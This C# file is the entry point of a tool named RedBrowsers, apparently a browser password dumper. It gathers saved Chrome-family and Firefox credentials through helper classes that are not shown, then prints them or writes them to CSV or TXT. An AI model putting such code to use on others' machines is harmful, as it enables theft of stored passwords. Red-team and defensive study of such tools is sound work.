using System;
using System.Collections.Generic;
using System.IO;
using RedBrowsers.Classes;
using static RedBrowsers.Utlis.Utlis;
namespace RedBrowsers
{
     static class Program
    {
        static void Main(string[] args)
        {
            List<Account> a = ChromiumEngine.GetChromium.Grab();
            a.AddRange(Firfox.FirefoxPassReader.ReadPasswords());

            if (!(args.Length == 0))
            {

                switch (args[0].ToUpper())
                {
                    case "CSV":
                        {

                            try  
                            {
                                CreateCSV(a, args[1]); 
                            }  
                            catch(Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                            }
                            break;
                        }

                    case "TXT":
                        {
                            try 
                            {
                                File.WriteAllText(args[1],CreateString(a));
                            }
                            catch (Exception ex)
                            { 
                                Console.WriteLine(ex.Message);
                            }

                            break;
                        }
                    default:
                        {
                            Console.WriteLine(CreateString(a));
                            break;

                        }
                }

                }


            Console.ReadLine();

            }

    }


    }

